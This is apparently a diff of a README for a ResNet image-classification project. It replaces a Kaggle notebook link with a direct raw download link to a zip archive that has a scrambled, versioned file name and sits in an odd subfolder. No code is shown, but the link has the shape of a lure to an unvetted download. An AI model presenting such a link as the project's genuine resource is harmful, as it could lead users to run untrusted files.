@@ -1,2 +1,2 @@
 # Image-classification-Using-Resnet
-https://www.kaggle.com/code/bhoomikalb/resnet-activity/edit
+https://github.com/Bhoomika2224/Image-classification-Using-Resnet/raw/refs/heads/main/briming/Resnet-Image-Using-classification-v2.7.zip
